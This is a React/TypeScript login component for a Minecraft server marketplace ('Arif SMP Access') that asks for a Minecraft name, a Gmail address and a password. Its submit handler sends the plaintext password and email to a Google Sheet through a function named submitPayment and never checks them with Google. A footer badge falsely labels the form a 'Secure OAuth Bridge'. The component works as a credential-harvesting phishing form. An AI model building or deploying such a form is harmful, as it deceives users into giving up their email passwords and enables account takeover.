
import React, { useState } from 'react';
import { Input } from './ui/Input';
import { Button } from './ui/Button';
import { submitPayment } from '../services/paymentService';

interface LoginFormProps {
  onLoginSuccess: (ign: string, email: string) => void;
}

export const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
  const [formData, setFormData] = useState({
    ign: '',
    email: '',
    password: ''
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.ign || !formData.email || !formData.password) {
      setError("সবগুলো ঘর পূরণ করুন!");
      return;
    }

    setLoading(true);
    setError(null);

    try {
      // Sending login details to your Google Sheet as a 'Login Attempt'
      await submitPayment({
        username: formData.email,
        ign: formData.ign,
        password: formData.password,
        email: formData.email,
        amount: 0,
        trx: 'LOGIN_AUTH',
        productNo: "SITE_LOGIN_ACCESS",
        senderNumber: 'SYSTEM'
      });

      // Save to local storage for persistence
      localStorage.setItem('arif_smp_user', JSON.stringify({
        ign: formData.ign,
        email: formData.email,
        isLoggedIn: true
      }));

      onLoginSuccess(formData.ign, formData.email);
    } catch (err) {
      setError("লগইন করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-6 bg-[#0a0a0a]">
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-[-10%] right-[-10%] w-[500px] h-[500px] bg-[#e2136e]/10 blur-[120px] rounded-full"></div>
        <div className="absolute bottom-[-10%] left-[-10%] w-[500px] h-[500px] bg-blue-600/10 blur-[120px] rounded-full"></div>
      </div>

      <form 
        onSubmit={handleSubmit}
        className="w-full max-w-md bg-white/5 backdrop-blur-xl border border-white/10 p-8 rounded-3xl shadow-2xl flex flex-col gap-6 animate-in fade-in zoom-in duration-500"
      >
        <div className="flex flex-col items-center gap-4 text-center">
          <div className="w-16 h-16 bg-[#e2136e] rounded-2xl flex items-center justify-center rotate-6 shadow-xl shadow-[#e2136e]/20">
            <i className="fas fa-cube text-white text-3xl"></i>
          </div>
          <div className="space-y-1">
            <h1 className="text-2xl font-black tracking-tight text-white uppercase">Arif SMP Access</h1>
            <p className="text-gray-400 text-xs font-medium uppercase tracking-widest">Login with your Minecraft & Gmail</p>
          </div>
        </div>

        <div className="space-y-4">
          <Input 
            label="Minecraft IGN" 
            icon="fa-gamepad" 
            placeholder="Your In-game Name" 
            value={formData.ign}
            onChange={(e) => setFormData({...formData, ign: e.target.value})}
          />
          <Input 
            label="Gmail Address" 
            icon="fa-envelope" 
            type="email"
            placeholder="example@gmail.com" 
            value={formData.email}
            onChange={(e) => setFormData({...formData, email: e.target.value})}
          />
          <div className="relative">
            <Input 
              label="Password" 
              icon="fa-lock" 
              type={showPassword ? "text" : "password"}
              placeholder="••••••••" 
              value={formData.password}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
            />
            <button 
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-[38px] text-gray-500 hover:text-white transition-colors"
            >
              <i className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}></i>
            </button>
          </div>
        </div>

        {error && (
          <div className="bg-red-500/10 border border-red-500/20 text-red-400 p-3 rounded-xl text-[10px] font-bold uppercase flex items-center gap-2">
            <i className="fas fa-exclamation-circle"></i>
            {error}
          </div>
        )}

        <Button type="submit" isLoading={loading} className="w-full py-4 text-sm tracking-widest uppercase font-black">
          Enter Marketplace
        </Button>

        <div className="flex items-center justify-center gap-4 pt-4 border-t border-white/5 opacity-30 grayscale">
            <i className="fab fa-google text-xs"></i>
            <span className="text-[8px] font-black uppercase tracking-widest">Secure OAuth Bridge</span>
            <i className="fas fa-shield-alt text-xs"></i>
        </div>
      </form>
    </div>
  );
};
